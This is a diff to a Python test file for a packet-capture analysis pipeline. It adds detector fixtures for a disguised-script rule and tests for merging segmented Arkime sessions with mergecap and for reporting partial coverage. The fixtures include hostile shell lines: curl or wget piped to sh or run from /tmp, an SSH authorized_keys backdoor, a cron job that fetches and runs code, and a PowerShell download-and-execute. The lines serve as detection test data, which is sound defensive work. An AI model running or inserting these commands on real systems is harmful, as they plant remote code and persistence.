@@ -70,6 +70,11 @@ RULE = "pcap.disguised_script_or_executable"
     (b"echo 'source /opt/env.sh' >> ~/.bashrc\n", "script", "heuristic"),          # profile persistence
     (b"echo x > /tmp/.k\nchmod 700 /tmp/.k\n/tmp/.k\n", "script", "heuristic"),    # staged, then run
     (b"cd /tmp\nwget http://e/x\nif [ -f x ]; then\n./x\nelse\nexit 1\nfi\n", "script", "heuristic"),
+    (b"[ -x /usr/bin/curl ] && curl -s http://e/x | sh\n", "script", "heuristic"),     # test-builtin lines
+    (b"[ -d /root/.ssh ] || mkdir /root/.ssh; echo k >> /root/.ssh/authorized_keys\n", "script", "heuristic"),
+    (b"echo '* * * * * curl e|sh' | crontab -\n", "script", "heuristic"),           # piped into crontab
+    (b"/etc/passwd user accounts\n/etc/shadow password hashes\n", "text", None),    # paths with descriptions
+    (b"echo done > /root/install.log\n", "text", None),                            # not a persistence target
     ("\ufeffIEX (iwr http://e/a)\n".encode("utf-16"), "script", "heuristic"),     # UTF-16 PowerShell
     (b"# Project notes\n\nInstall the package, then run the tests.\n", "text", None),
     # hard benign: command lists that fetch, run, decode or persist nothing
@@ -304,6 +309,24 @@ def test_tshark_runs_the_fixed_query_with_pinned_prefs_and_json_output(tmp_path,
     assert "preexec_fn" not in kw                              # limits come from prlimit, not a forked hook
 
 
+def test_merge_runs_mergecap_on_allowed_paths_only(tmp_path, monkeypatch):
+    parts = []
+    for i in range(2):
+        part = tmp_path / f"p{i}.pcap"
+        part.write_bytes(PCAP)
+        parts.append(part)
+    calls = []
+    monkeypatch.setattr(pk.subprocess, "run", lambda cmd, **kw: calls.append(cmd) or subprocess.CompletedProcess(cmd, 0))
+    assert pk.merge_captures(Settings(home=tmp_path), parts, tmp_path / "m.pcap", [tmp_path]) is None
+    cmd = calls[0]
+    i = next(j for j, a in enumerate(cmd) if a.endswith("mergecap") or a == "mergecap" or "mergecap" in a)
+    assert cmd[i + 1:i + 3] == ["-w", str(tmp_path / "m.pcap")] and cmd[-2:] == [str(p.resolve()) for p in parts]
+    outside = tmp_path.parent / "elsewhere-merge"
+    outside.mkdir(exist_ok=True)
+    with pytest.raises(pk.PacketError):
+        pk.merge_captures(Settings(home=tmp_path), parts, outside / "m.pcap", [tmp_path])
+
+
 def test_tshark_limits_use_prlimit_where_it_exists(monkeypatch):
     monkeypatch.setattr(pk.os, "name", "posix")
     monkeypatch.setattr(pk.shutil, "which", lambda name: "/usr/bin/prlimit" if name == "prlimit" else None)
@@ -361,14 +384,23 @@ def test_addresses_use_the_innermost_ip_layer():
 # ---- the stage, end to end with stubbed Arkime and TShark ---------------------------------------
 
 class _Packets:
-    def __init__(self, error=None, capped=False):
-        self.error, self.capped = error, capped
+    def __init__(self, error=None, capped=False, max_bytes=32 * 1024 * 1024):
+        self.error, self.capped, self.max_bytes, self.calls = error, capped, max_bytes, []
 
     def fetch(self, ids, dest):
+        self.calls.append(list(ids))
         if self.error:
             return pk.PacketFetch(None, ids, error=self.error)
         dest.write_bytes(PCAP)
         return pk.PacketFetch(dest, ids, len(PCAP), capped=self.capped)
+
+
+def _merge(merges=None):
+    def merge(s, parts, dest, dirs):
+        if merges is not None:
+            merges.append([x.name for x in parts])
+        dest.write_bytes(PCAP)
+    return merge
 
 
 def _ms(dt):
@@ -398,7 +430,7 @@ def _contract(**extra):
 
 
 def _stage(tmp_path, monkeypatch, packets=None, *, sessions=None, rows=None, outcome=None, contract=None,
-           intents=None, window=None):
+           intents=None, window=None, merges=None):
     sessions = sessions if sessions is not None else [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
     rows = rows if rows is not None else [_row(50000 + i, T0.timestamp() + 900 * i) for i in range(3)]
 
@@ -414,6 +446,7 @@ def _stage(tmp_path, monkeypatch, packets=None, *, sessions=None, rows=None, out
 
     monkeypatch.setattr(hp, "execute", execute)
     monkeypatch.setattr(hp, "run_tshark", lambda s, pcap, query, dirs, http_ports=(): pk.TsharkResult(rows=rows))
+    monkeypatch.setattr(hp, "merge_captures", _merge(merges))
     engine = make_engine(":memory:")
     migrate(engine)
     repo = Repo(engine)
@@ -456,6 +489,7 @@ def test_coverage_counts_pcap_cells_for_their_target_and_states_the_selection(tm
         total=len(sessions) if intent.kind == "raw" else 7, total_relation="eq", returned=len(sessions),
         records=sessions if intent.kind == "raw" else []))
     monkeypatch.setattr(hp, "run_tshark", lambda s, pcap, query, dirs, http_ports=(): pk.TsharkResult(rows=rows))
+    monkeypatch.setattr(hp, "merge_captures", _merge())
     host = contract_from_types("logs-lab", {"@timestamp": "date", "host.name": "keyword"})
     window = Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=2))
     hp.run_packet_stage(Settings(home=tmp_path), repo, None, "h1", window, {TARGET: _contract(), "logs-lab": host},
@@ -634,13 +668,46 @@ def test_segments_of_one_session_are_one_session_and_cite_the_segment_holding_th
         T0 - timedelta(minutes=25): seg1["_id"], T0 + timedelta(minutes=5): seg2["_id"]}
 
 
-def test_segments_stay_in_one_batch():
-    lone = [_session(f"241118-LONE{i:08d}", 40000 + i) for i in range(15)]
-    segs = [_session(f"241118-SEGS{i:08d}", 50000, T0, T0 + timedelta(minutes=i)) for i in range(10)]
-    batches = hp._batches(lone + segs)
-    assert [len(b) for b in batches] == [15, 10]
-    big = [_session(f"241118-BIGS{i:08d}", 50000, T0, T0 + timedelta(minutes=i)) for i in range(45)]
-    assert [len(b) for b in hp._batches(big)] == [20, 20, 5]
+def test_multi_segment_sessions_are_their_own_unit_in_time_order():
+    lone = [_session(f"241118-LONE{i:08d}", 40000 + i) for i in range(25)]
+    segs = [_session(f"241118-SEGS{i:08d}", 50000, T0, T0 + timedelta(minutes=10 - i)) for i in range(10)]
+    units = hp._units(segs[:3] + lone + segs[3:])
+    assert [(merged, len(docs)) for merged, docs in units] == [(True, 10), (False, 20), (False, 5)]
+    assert [d["_id"] for d in units[0][1]] == [s["_id"] for s in reversed(segs)]       # lastPacket ascending
+
+
+def test_segments_are_fetched_one_by_one_in_order_and_merged(tmp_path, monkeypatch):
+    late = _session("241118-SEGLATE00000", 50000, T0 - timedelta(minutes=30), T0 + timedelta(minutes=10))
+    early = _session("241118-SEGEARLY0000", 50000, T0 - timedelta(minutes=30), T0 - timedelta(minutes=20))
+    packets, merges = _Packets(), []
+    _stage(tmp_path, monkeypatch, packets, sessions=[late, early], rows=[], merges=merges)
+    assert packets.calls == [[early["_id"]], [late["_id"]]]
+    assert merges == [["batch-0-seg0.pcap", "batch-0-seg1.pcap"]]
+    assert not list((tmp_path / "stage").glob("romulus-pcap-*"))
+
+
+def test_a_long_session_beyond_the_byte_budget_is_truncated_and_partial(tmp_path, monkeypatch):
+    segs = [_session(f"241118-SEG{i:011d}", 50000, T0 - timedelta(minutes=30), T0 + timedelta(minutes=i))
+            for i in range(5)]
+    packets = _Packets(max_bytes=len(PCAP) * 2)
+    repo, summary = _stage(tmp_path, monkeypatch, packets, sessions=segs, rows=[_row(50000, T0.timestamp())])
+    assert len(packets.calls) == 2 and summary["truncated_batches"] == 1
+    _partial(repo, summary, "one session's 5 segments) capture incomplete (download byte cap)")
+
+
+def test_a_response_arkime_saw_but_tshark_could_not_rebuild_is_partial(tmp_path, monkeypatch):
+    streamed = _session("241118-SESS00000002", 50002)
+    streamed["_source"]["http"] = {"statuscode": [200]}
+    streamed["_source"]["server"] = {"bytes": 426}
+    sessions = [_session("241118-SESS00000000", 50000), _session("241118-SESS00000001", 50001), streamed]
+    request = {"frame.number": ["3"], "frame.time_epoch": [str(T0.timestamp())],
+               "frame.protocols": ["eth:ethertype:ip:tcp:http"], "ip.src": ["172.17.100.121"],
+               "tcp.srcport": ["50002"], "ip.dst": ["192.0.2.174"], "tcp.dstport": ["80"],
+               "http.request.method": ["GET"], "http.response.code": []}
+    rows = [_row(50000, T0.timestamp()), _row(50001, T0.timestamp()), request]
+    repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, rows=rows)
+    assert summary["sessions_unrebuilt_response"] == 1 and summary["sessions_request_only"] == 0
+    _partial(repo, summary, "a response Arkime recorded that TShark could not rebuild")
 
 
 def test_overlapping_same_tuple_sessions_are_ambiguous_and_partial(tmp_path, monkeypatch):
